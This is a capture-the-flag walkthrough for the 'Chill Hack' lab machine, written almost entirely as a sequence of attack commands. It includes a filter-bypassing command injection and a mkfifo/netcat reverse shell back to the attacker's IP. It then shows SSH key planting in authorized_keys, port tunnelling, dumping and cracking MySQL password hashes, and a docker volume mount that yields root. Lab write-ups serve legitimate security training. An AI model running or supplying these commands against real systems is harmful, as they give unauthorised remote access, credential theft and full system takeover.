# Chill Hack

- User Flag

	- `scilla port -target <TARGET_IP> -p -1000`
	- `ftp <TARGET_IP>`
	- `anonymous`, no password
	- `get note.txt`
	- `scilla dir -target <TARGET_IP>`
	- secret directory found.
	- Execute `cat /etc/passwd`. ahahhahahahahahahhaa.
	- So, execute `cat</etc/passwd`
	- `nc -lnvp 1234`
	- `r"m" /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 1234 >/tmp/f`
	- Cool.
	- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
	- `cd /home`
	- `sudo -l`
	- `cd apaar`
	- `sudo -u apaar /home/apaar/.helpline.sh`
	- `/bin/sh` and `/bin/sh`
	- `id`
	- `cat local.txt`
	- `{USER-FLAG: *********************************}`

- Root Flag

	- `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
	- `python3 -m http.server`
	- On target `curl <YOUR_IP>:8000/LinEnum.sh > linenum.sh`
	- `chmod +x linenum.sh`
	- `./linenum.sh`
	~~~
	[-] Listening TCP:
	Active Internet connections (only servers)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
	tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
	tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
	tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -                   
	tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
	~~~
	- On your machine `ssh-keygen`
	- `cd ~/.ssh`
	- `python3 -m http.server`
	- On target `curl <YOUR_IP>:8000/id_rsa.pub > ~/.ssh/authorized_keys`
	- `chmod 600 id_rsa`
	- `ssh -L 9001:127.0.0.1:9001 -i id_rsa apaar@<TARGET_IP>`
	- `cat /var/www/files/index.php`
	- Found username and password for MySQL database.
	- `mysql -u root -p` and enter the password found.
	- `show databases;`
	- `use webportal;`
	- `show tables;`
	- `select * from users;`
	- Save those two hashes
	- `john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`
	- Login into the website at localhost:9001
	- Download the image and execute `steghide extract -sf hacker-with-laptop_23-2147985341.jpg`
	- `fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip`
	- Inspect `source_code.php`
	- `echo ******************** | base64 -d`
	- `su anurodh` and enter password
	- `docker images`
	- `docker run -v /root:/mnt -it alpine`
	- `cat /mnt/proof.txt`
	- `{ROOT-FLAG: ********************************}`





